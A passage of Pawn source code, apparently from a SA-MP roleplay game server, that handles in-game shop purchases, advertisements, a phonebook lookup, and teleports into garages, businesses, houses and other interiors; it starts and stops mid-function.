		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -800);
			format(string, sizeof(string), "* %s has bought 5 blindfolds for $800.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can blindfold someone now. (( /blindfold ))");
		}
		if(!strcmp(var, "Walkietalkie", true))
		{
	        if(Player[playerid][pMoney] < 2500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a walkietalkie.");
	        if(Player[playerid][pWT] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already got a walkietalkie.");
		    Player[playerid][pWT] = 1;
		    BizInfo[idx][bMoney] += 2500;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -2500);
			format(string, sizeof(string), "* %s has bought a WalkieTalkie for $2500.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, " You can use /wtc to adjust the WalkieTalkie's channel, /wt to talk on it.");
		}
		if(!strcmp(var, "Camera", true))
		{
	        if(Player[playerid][pMoney] < 2500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a camera.");
			GiveZamoraWeapon(playerid, 43, 999999);
		    BizInfo[idx][bMoney] += 2500;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -2500);
			format(string, sizeof(string), "* %s has bought a professional camera for $2500.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can start taking photos using your camera.");
		}
		if(!strcmp(var, "Gascan", true))
		{
	        if(Player[playerid][pMoney] < 3000) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a gascan.");
	        if(Player[playerid][pGas] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You already got a gascan.");
		    Player[playerid][pGas] = 1;
		    BizInfo[idx][bMoney] += 3000;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -3000);
			format(string, sizeof(string), "* %s has bought a gas can for $3000.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can use refill vehicle anywhere now. (( /refill ))");
		}
		if(!strcmp(var, "speedo", true))
		{
	        if(Player[playerid][pMoney] < 6000) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a speedo.");
	        if(Player[playerid][pSpeedo] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You already got a gascan.");
		    Player[playerid][pSpeedo] = 1;
		    BizInfo[idx][bMoney] += 6000;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -6000);
			format(string, sizeof(string), "* %s has bought a speedo for $6000.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can use speedo inside a vehicle. (( /tog ))");
		}
	}
	else if(BizInfo[idx][bType] == 3)
	{
		if(sscanf(var, "i", type)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buy [type]");
		if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
		if(type == 1) price = 3000;
		else if(type == 2) price = 3200;
		else if(type == 3) price = 3600;
		else if(type == 4) price = 4000;
		else if(type == 5) price = 5000;
		if(type < 1 || type > 6) return SendClientMessage(playerid, COLOR_GRAD2, "Products are between 1 and 6");
		if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy.");
		switch(type)
		{
		    case 1:
		    {
				if(GetPlayerWeapon(playerid) != 25 && GetPlayerWeapon(playerid) != 26) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding the right weapon for this type of ammo.");
				if(GetPlayerWeapon(playerid) == 25) GiveZamoraWeapon(playerid, 25, 50);
				if(GetPlayerWeapon(playerid) == 26) GiveZamoraWeapon(playerid, 26, 50);
				format(string, sizeof(string), "* %s has bought 50 shotgun bullets for $%d.", GetName(playerid), price);
		    }
		    case 2:
		    {
				if(GetPlayerWeapon(playerid) != 33 && GetPlayerWeapon(playerid) != 34) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding the right weapon for this type of ammo.");
				if(GetPlayerWeapon(playerid) == 33) GiveZamoraWeapon(playerid, 33, 50);
				if(GetPlayerWeapon(playerid) == 34) GiveZamoraWeapon(playerid, 34, 50);
				format(string, sizeof(string), "* %s has bought 50 rifle bullets for $%d.", GetName(playerid), price);
		    }
		    case 3:
		    {
       		    if(GetPlayerWeapon(playerid) == 24 && Player[playerid][pSpecialWeapon] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to buy bullets for a special weapon.");
				if(GetPlayerWeapon(playerid) != 22 && GetPlayerWeapon(playerid) != 23 && GetPlayerWeapon(playerid) != 24) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding the right weapon for this type of ammo.");
				if(GetPlayerWeapon(playerid) == 22) GiveZamoraWeapon(playerid, 22, 120);
				if(GetPlayerWeapon(playerid) == 23) GiveZamoraWeapon(playerid, 23, 120);
				if(GetPlayerWeapon(playerid) == 24) GiveZamoraWeapon(playerid, 24, 120);
				format(string, sizeof(string), "* %s has bought 120 gun bullets for $%d.", GetName(playerid), price);
		    }
		    case 4:
		    {
       		   // if(BizInfo[idx][bLevel] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "This Ammunation doesn't have this product yet.");
				if(GetPlayerWeapon(playerid) != 28 && GetPlayerWeapon(playerid) != 29 && GetPlayerWeapon(playerid) != 32) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding the right weapon for this type of ammo.");
				if(GetPlayerWeapon(playerid) == 28) GiveZamoraWeapon(playerid, 28, 120);
				if(GetPlayerWeapon(playerid) == 29) GiveZamoraWeapon(playerid, 29, 120);
				if(GetPlayerWeapon(playerid) == 32) GiveZamoraWeapon(playerid, 32, 120);
				format(string, sizeof(string), "* %s has bought 120 light-machinegun bullets for $%d.", GetName(playerid), price);
		    }
		    case 5:
		    {
		   	 	if(GetPlayerWeapon(playerid) == 30 && Player[playerid][pSpecialWeapon] == 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to buy bullets for a special weapon.");
		   	 	if(GetPlayerWeapon(playerid) == 31 && Player[playerid][pSpecialWeapon] == 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to buy bullets for a special weapon.");
		   	 	if(GetPlayerWeapon(playerid) == 27 && Player[playerid][pSpecialWeapon] == 4) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to buy bullets for a special weapon.");
				if(GetPlayerWeapon(playerid) != 30 && GetPlayerWeapon(playerid) != 31 && GetPlayerWeapon(playerid) != 27) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding the right weapon for this type of ammo.");
				if(GetPlayerWeapon(playerid) == 30) GiveZamoraWeapon(playerid, 30, 120);
				if(GetPlayerWeapon(playerid) == 31) GiveZamoraWeapon(playerid, 31, 120);
				if(GetPlayerWeapon(playerid) == 27) GiveZamoraWeapon(playerid, 27, 120);
				format(string, sizeof(string), "* %s has bought 120 heavy-machinegun bullets for $%d.", GetName(playerid), price);
		    }
		}
		GiveZamoraMoney(playerid, -price);
		BizInfo[idx][bMoney] += price;
		BizInfo[idx][bProducts] --;
		BizInfo[idx][bSold] ++;
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		return 1;
	}
	else if(BizInfo[idx][bType] == 4)
	{
		if(sscanf(var, "i", type)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buy [type]");
		if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
		if(type == 1) price = 500;
		else if(type == 2) price = 800;
		else if(type == 3) price = 1000;
		if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford a drink.");
		switch(type)
		{
		    case 1:
		    {
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_SPRUNK);
		        format(string, sizeof(string), "* %s has bought a sprunk can $%d.", GetName(playerid), price);
		    }
		    case 2:
		    {
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
		        format(string, sizeof(string), "* %s has bought a bottle of beer for $%d.", GetName(playerid), price);
		    }
		    case 3:
		    {
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
		        format(string, sizeof(string), "* %s has bought a bottle of vodka for $%d.", GetName(playerid), price);
		    }
		}
		GiveZamoraMoney(playerid, -price);
		BizInfo[idx][bMoney] += price;
		BizInfo[idx][bProducts] --;
		BizInfo[idx][bSold] ++;
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else if(BizInfo[idx][bType] == 6)
	{
		if(sscanf(var, "i", type)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buy [type]");
		if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
		if(type == 1) price = 800;
		else if(type == 2) price = 1300;
		else if(type == 3) price = 2000;
		if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a meal..");
		new Float:pH;
		switch(type)
		{
		    case 1:
		    {
		        GetPlayerHealth(playerid, pH);
		        SetPlayerHealth(playerid, pH+20);
		        GetPlayerHealth(playerid, pH);
		        if(pH > 100) SetPlayerHealth(playerid, 100);
		        format(string, sizeof(string), "* %s has bought a small meal for $%d.", GetName(playerid), price);
		    }
		    case 2:
		    {
		        GetPlayerHealth(playerid, pH);
		        SetPlayerHealth(playerid, pH+40);
		        GetPlayerHealth(playerid, pH);
		        if(pH > 100) SetPlayerHealth(playerid, 100);
		        format(string, sizeof(string), "* %s has bought a medium meal for $%d.", GetName(playerid), price);
		    }
		    case 3:
		    {
		        SetPlayerHealth(playerid, 100);
		        format(string, sizeof(string), "* %s has bought a large meal for $%d.", GetName(playerid), price);
		    }
		}
		GiveZamoraMoney(playerid, -price);
		BizInfo[idx][bMoney] += price;
		BizInfo[idx][bProducts] --;
		BizInfo[idx][bSold] ++;
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	return 1;
}
IRP:phonebook(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pPhonebook]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a phonebook.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /phonebook [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!Player[playerid][pPhone]) return SendClientMessage(playerid, COLOR_GRAD2, "Player has no cellphone.");
	format(string, sizeof(string), "[Phonebook] Name: %s - Ph: %d", GetName(user), Player[user][pPhone]);
	SendClientMessage(playerid, COLOR_LIGHTSALMON, string);
	return 1;
}

IRP:ad(playerid, var[])
{
	new idx = GetPlayerVirtualWorld(playerid)-100, price = strlen(var) * 6, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You need to be at least level 2 to create an advertisement.");
	if(Player[playerid][pPhone] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You need a cellphone first before you place a advertisement");
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 5 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside an Advertisement Agency.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ad [advertisement]");
	if(strlen(var) > 64) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters allowed per advertisement are 64.");
	if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
	if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to put an advertisement.");
	if(HasAD[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, " You must wait for your advertisement to be published before making a new one.");
	if(AdQueue == MAX_ADS-1) return SendClientMessage(playerid, COLOR_GRAD2, " There are no queue slots for your advertisement.");
	// Advertisement
    HasAD[playerid] = 1;
	if(LastAd) SendClientMessage(playerid, COLOR_LIGHTBLUE, " Your advertisement has been placed in the queue, wait for about 60 seconds maximum.");
    format(AD[AdQueue], 128, "Advertisement: %s, Contact: %s - Ph: %d", var, GetName(playerid), Player[playerid][pPhone]);
    iAD[AdQueue] = 0;
    format(iAdName[AdQueue], 32, "%s", BizInfo[idx][bOwner]);
    AdQueue++;
    GiveZamoraMoney(playerid, -price);
    BizInfo[idx][bMoney] += price/2;
    BizInfo[idx][bProducts] --;
    NewsMoney = price/2;
    format(string, sizeof(string), "* %s has placed an advertisement in the queue for $%d.", GetName(playerid), price);
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SendClientMessage(playerid, COLOR_WHITE, " You have been charged $5 per character.");
	return 1;
}

IRP:entergarage(playerid, var[])
{
	new string[256];
	if(!Logged(playerid)) return NoLogin(playerid);
 	for(new idx=1; idx<MAX_GARAGES; idx++) // Dynamic Garages
	{
		if(IsPlayerInRangeOfPoint(playerid, 2, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
	    {
		    if(!GarageInfo[idx][gStatus] && Player[playerid][pGarage] != idx) return SendClientMessage(playerid, COLOR_GRAD2, "This garage is locked.");
		    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	        format(string, sizeof(string), "* %s lifts the door and enters the garage.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        SetPlayerVirtualWorld(playerid, idx+200);
			if(GarageInfo[idx][gLevel] == 1)
			{
			    SetPlayerPos(playerid, 1342.0830,-1546.7599,10037.3174);
			    SetPlayerInterior(playerid, 0);
			    SetCameraBehindPlayer(playerid);
			}
			return 1;
		}
	}
	return 1;
}
IRP:exitgarage(playerid, var[])
{
	new done, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(IsPlayerInRangeOfPoint(playerid, 20, 1342.0830,-1546.7599,10037.3174)) // Garages
    {
        new idx;
        idx = GetPlayerVirtualWorld(playerid)-200;
        if(!done && idx < MAX_GARAGES && GarageInfo[idx][gLevel])
		{
			format(string, sizeof(string), "* %s lifts the door up and exits the garage.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
            SetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
		    SetPlayerInterior(playerid, 0);
		    SetCameraBehindPlayer(playerid);
	  	    SetPlayerVirtualWorld(playerid, 0);
	        done = 1;
        }
	}
	return 1;
}
IRP:enter(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	for(new idx=0; idx<MAX_DOORS; idx++) // Dynamic Doors
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]))
	    {
	        if(DoorInfo[idx][dCInt])
	        {
	            GameTextForPlayer(playerid, "~w~Loading Objects", 3500, 3);
				TogglePlayerControllable(playerid, 0);
	            SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
	            Player[playerid][pSpawnFreeze] = 1;
	        }
	        Player[playerid][pSpawnFreeze] = 0;
	        SetPlayerInterior(playerid, DoorInfo[idx][dIInt]);
	        SetPlayerVirtualWorld(playerid, DoorInfo[idx][dIVW]);
	        SetPlayerFacingAngle(playerid, DoorInfo[idx][dIA]);
	        SetCameraBehindPlayer(playerid);
	        SetPlayerPos(playerid, DoorInfo[idx][dIX], DoorInfo[idx][dIY], DoorInfo[idx][dIZ]);
	        return 1;
	    }
	}
	for(new idx=1; idx<MAX_BIZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
		{
            if(DayNoShops == 1) return SendClientMessage(playerid, COLOR_GRAD2, "Today is sunday, All shops are closed.");
		    if(!BizInfo[idx][bStatus] && Player[playerid][pBiz] != idx && !Player[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "This business is closed.");
		    if(BizInfo[idx][bType] == 1) // market Business
		    {
		        format(string, sizeof(string), "* %s pushes the door and enters the shop.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, -27.3025,-57.6649,1003.5469);
		        SetPlayerFacingAngle(playerid, 357.5915);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 6);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "%s", BizInfo[idx][bMessage]);
		        SendClientMessage(playerid, COLOR_INT, string);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 2) // Clothes Shop Business
		    {
		        format(string, sizeof(string), "* %s pushes the door and enters the shop.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 207.0638,-139.9965,1003.5078);
		        SetPlayerFacingAngle(playerid, 356.3849);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 3);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "%s", BizInfo[idx][bMessage]);
		        SendClientMessage(playerid, COLOR_INT, string);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 3) // Ammunation Business
		    {
		        format(string, sizeof(string), "* %s pushes the door and enters the shop.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 285.8044,-85.9956,1001.5229);
		        SetPlayerFacingAngle(playerid, 358.9898);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 4);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "%s", BizInfo[idx][bMessage]);
		        SendClientMessage(playerid, COLOR_INT, string);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 4) // Club Business
		    {
		        format(string, sizeof(string), "* %s pushes the door and enters the shop.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 493.4252,-24.3061,1000.6797);
		        SetPlayerFacingAngle(playerid, 0.2432);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 17);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "%s", BizInfo[idx][bMessage]);
		        SendClientMessage(playerid, COLOR_INT, string);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 5) // Advertisement Agency
		    {
		        format(string, sizeof(string), "* %s pushes the door and enters the shop.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 834.1631,7.4883,1004.1797);
		        SetPlayerFacingAngle(playerid, 86.7239);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 3);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "%s", BizInfo[idx][bMessage]);
		        SendClientMessage(playerid, COLOR_INT, string);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 6) // Fast Food
		    {
		        format(string, sizeof(string), "* %s pushes the door and enters the shop.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 372.3830,-133.2579,1001.4922);
		        SetPlayerFacingAngle(playerid, 0.4216);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 5);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "%s", BizInfo[idx][bMessage]);
		        SendClientMessage(playerid, COLOR_INT, string);
		        return 1;
		    }
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,2,1555.1262, -1675.5813, 16.1953)) //LSPD
	{
		SetPlayerPos(playerid,1544.3728,-1649.5261,-25.5641);
		SetPlayerFacingAngle(playerid,5.3270);
		TogglePlayerControllable(playerid,0);
        SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,2,806.7476,-2431.9968,14.0009)) //Prison
	{
		SetPlayerPos(playerid,-2044.7102,-187.0223,991.5363);
		SetPlayerFacingAngle(playerid,177.5230);
		TogglePlayerControllable(playerid,0);
        SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,2,1568.5875,-1690.7570,5.8906)) //LSPDGARAGE
	{
		SetPlayerPos(playerid,1522.7655,-1584.8519,-28.5641);
		SetPlayerFacingAngle(playerid,5.3270);
		TogglePlayerControllable(playerid,0);
        SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,2,1565.2576,-1665.6483,28.3956)) //LSPD Roof
	{
		SetPlayerPos(playerid,1527.5353,-1586.3845,-25.5641);
		SetPlayerFacingAngle(playerid,2.8338);
		TogglePlayerControllable(playerid,0);
        SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,6);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,2,1480.9678,-1771.8704,18.7958)) //CityHall
	{
		SetPlayerPos(playerid,389.5916,173.6717,1008.3828);
		SetPlayerFacingAngle(playerid,86.8080);
		TogglePlayerControllable(playerid,0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,3);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2229.9487,-1721.3040,13.5618)) //GantonGym
	{
        SetPlayerPos(playerid,772.111999,-3.898649,1000.728820);
        SetPlayerFacingAngle(playerid, 319.7674);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,5);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2165.9492,-1671.1947,15.0732)) //SeedsHouse
	{
        SetPlayerPos(playerid,318.5597,1115.4316,1083.8828);
        SetPlayerFacingAngle(playerid, 1.1448);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,5);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2351.9326,-1170.6655,28.0747)) //cocaineLab
	{
        SetPlayerPos(playerid,2352.2483,-1180.9229,1027.9766);
        SetPlayerFacingAngle(playerid, 88.0345);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,5);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,65.4823,-292.5736,1.5781)) //Drugs Factory
	{
        SetPlayerPos(playerid,-1694.4518,1035.4573,45.2109);
        SetPlayerFacingAngle(playerid, 270.5542);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2045.6598,-1908.0221,13.5469)) //DMV Center
	{
        SetPlayerPos(playerid,1957.3972,-1134.7617,987.5298);
        SetPlayerFacingAngle(playerid, 270.5542);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,1172.4875,-1323.2266,15.4027)) // All Saints
	{
        SetPlayerPos(playerid,-2653.9673,1390.7808,945.5359);
        SetPlayerFacingAngle(playerid, 84.6395);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,1831.0460,-1075.4194,23.8367)) // VIP Lounge
	{
    	if(Player[playerid][pVIP])
    	{
            SetPlayerPos(playerid,2784.5525,2394.6887,1240.5311);
            SetPlayerFacingAngle(playerid, 89.7077);
            TogglePlayerControllable(playerid, 0);
    		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
    		SetCameraBehindPlayer(playerid);
    		SetPlayerVirtualWorld(playerid, 0);
    		SetPlayerInterior(playerid,0);
    	}
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,1462.4424,-1011.7301,26.8438)) // Bank
	{
        SetPlayerPos(playerid,2235.7056,2070.3030,100.3772);
        SetPlayerFacingAngle(playerid, 354.6966);
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("EnterExitTimer", 1000, false, "i", playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
	}
	for(new idx=1; idx<MAX_FAMILIES; idx++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 2, FamInfo[idx][fHQX], FamInfo[idx][fHQY], FamInfo[idx][fHQZ]))
        {
			if(FamInfo[idx][fLevel] == 1)
			{
                SetPlayerPos(playerid, 2807.5747,-1173.9775,1025.5703);
		        SetPlayerInterior(playerid, 8);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerVirtualWorld(playerid, idx+800);
		        SetCameraBehindPlayer(playerid);
		    }
			else if(FamInfo[idx][fLevel] == 2)
			{
    			SetPlayerPos(playerid, 318.5597,1115.4316,1083.8828);
			    SetPlayerInterior(playerid, 5);
			    SetPlayerVirtualWorld(playerid, idx+800);
			    SetCameraBehindPlayer(playerid);
			}
			else if(FamInfo[idx][fLevel] == 3)
			{
    			SetPlayerPos(playerid, 502.1039,-68.0976,998.7578);
			    SetPlayerInterior(playerid, 11);
			    SetPlayerVirtualWorld(playerid, idx+800);
	    	    SetCameraBehindPlayer(playerid);
			}
		}
	}
	for(new idx=1; idx<MAX_HOUSES; idx++) // Dynamic Houses
	{
		if(IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]))
	    {
		    if(!HouseInfo[idx][hStatus] && Player[playerid][pHouse] != idx && Player[playerid][pVHouse] != idx) return SendClientMessage(playerid, COLOR_GRAD2, "This house is locked.");
	        format(string, sizeof(string), "* %s pushes the door and enters the house.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        SetPlayerVirtualWorld(playerid, idx+500);
			if(HouseInfo[idx][hLevel] == 1)
			{
				SetPlayerPos(playerid, 243.9951,304.9418,999.1484);
		        SetPlayerFacingAngle(playerid, 267.0980);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 1);
			}
			else if(HouseInfo[idx][hLevel] == 2)
			{
				SetPlayerPos(playerid, 2259.6702,-1135.8542,1050.6328);
		        SetPlayerFacingAngle(playerid, 267.3974);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 10);
			}
			else if(HouseInfo[idx][hLevel] == 3)
			{
				SetPlayerPos(playerid, 2308.8254,-1212.8070,1049.0234);
